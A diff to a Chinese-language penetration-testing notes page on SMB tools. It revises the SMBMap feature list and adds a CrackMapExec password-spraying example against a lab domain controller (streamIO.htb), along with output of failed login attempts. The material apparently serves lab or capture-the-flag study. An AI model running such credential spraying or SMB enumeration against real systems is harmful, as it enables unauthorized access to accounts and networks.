@@ -1,5 +1,5 @@
 ---
-title: 共享目录相关
+title: SMB、共享目录相关
 date: 2026-02-23T17:00:00+08:00
 draft: false
 toc: true
@@ -39,7 +39,13 @@ sudo smbclient \\\\10.10.10.10\\enil
 
 ## Smbmap
 
-SMBMap 允许用户在整个域中枚举 Samba 共享驱动器、驱动器权限、共享内容、上传/下载功能、文件名自动下载模式匹配，甚至执行远程命令。
+SMBMap 的核心功能如下：
+
+1. 枚举共享目录，列出目标机器上所有的 SMB 共享，以及当前用户的读写权限
+2. 匿名/凭据访问
+3. 递归目录
+4. 文件上传/下载
+5. 执行命令（需要 sudo 权限）
 
 - 枚举网站
 
@@ -83,6 +89,26 @@ CME 是一种后渗透测试工具，自动化评估大型 AD 网络的安全性
 ┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
 └─$ crackmapexec smb 10.129.6.162
 SMB         10.129.6.162    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
+```
+
+批量登入尝试。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali/StreamIO]
+└─$ crackmapexec smb streamio.htb -u user -p pass --no-bruteforce --continue-on-success
+SMB         watch.streamIO.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:highschoolmusical STATUS_LOGON_FAILURE 
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:physics69i STATUS_LOGON_FAILURE 
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:paddpadd STATUS_LOGON_FAILURE 
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:66boysandgirls.. STATUS_LOGON_FAILURE 
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:%$clara STATUS_LOGON_FAILURE 
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:$monique$1991$ STATUS_LOGON_FAILURE 
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:$hadoW STATUS_LOGON_FAILURE 
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:$3xybitch STATUS_LOGON_FAILURE 
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:##123a8j8w5123## STATUS_LOGON_FAILURE 
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:!5psycho8! STATUS_LOGON_FAILURE 
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:!?Love?!123 STATUS_LOGON_FAILURE 
+SMB         watch.streamIO.htb 445    DC               [-] streamIO.htb\user:!!sabrina$ STATUS_LOGON_FAILURE 
 ```
 
 ## Enum4linux
